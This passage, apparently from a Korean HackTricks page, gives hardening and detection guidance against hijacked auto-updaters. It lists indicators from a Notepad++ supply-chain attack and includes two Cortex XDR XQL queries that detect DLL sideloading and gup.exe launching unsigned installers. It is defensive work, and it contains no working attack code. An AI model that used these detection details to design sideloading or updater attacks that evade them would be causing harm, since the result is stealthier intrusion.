모든 auto-updater에 적용할 hardening/detection 참고 사항:
- 다운로드된 installer에 대해 **certificate 및 signature 검증**을 적용하고 (공급업체 signer를 pin하고, 일치하지 않는 CN/chain은 거부), 업데이트 manifest 자체에도 서명하세요 (예: XMLDSig). 검증되지 않은 manifest 제어 리디렉션은 차단하세요.
- **BYO 서명 binary sideloading**을 다운로드 후 탐지 지점으로 취급하세요. 서명된 공급업체 EXE가 정식 설치 경로 외부의 DLL 이름을 로드하거나 (예: Bitdefender가 Temp/Downloads에서 `log.dll`을 로드하는 경우), updater가 공급업체 서명이 없는 installer를 임시 경로에 생성/실행하면 경고를 발생시키세요.
- 이 체인에서 확인된 **악성코드별 흔적**을 모니터링하세요 (일반적인 탐지 지표로 활용 가능): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` 쓰기, Lua 기반 shellcode injection 단계.
- Notepad++는 v8.8.9 이후 WinGUp을 강화했습니다. 반환되는 XML에 이제 서명(XMLDSig)이 포함되며, 최신 빌드는 전송 계층만 신뢰하는 대신 다운로드된 installer의 certificate 및 signature 검증을 적용합니다.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 서명 EXE의 <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행함</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

이러한 패턴은 서명되지 않은 매니페스트를 허용하거나 설치 프로그램의 서명자를 고정하지 않는 모든 updater에 적용됩니다. 네트워크 하이재킹 + 악성 설치 프로그램 + BYO 서명 사이드로딩은 “신뢰할 수 있는” 업데이트를 가장해 원격 코드 실행으로 이어집니다.

---
## References
- [1] [권고 – Netskope Client for Windows – 악성 서버를 통한 로컬 권한 상승 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 보안 권고 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope 플러그인](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/익스플로잇](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre 및 Razer Synapse 4 Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent의 쓰기 가능한 파일을 통한 로컬 권한 상승](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent의 권한 상승](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 국가 지원 공격자가 Notepad++ 공급망을 악용](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 인프라 하이재킹 사고 업데이트](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows에서 CVE-2025-0309 수정 우회하기](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage의 권한 상승 버그 발견](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
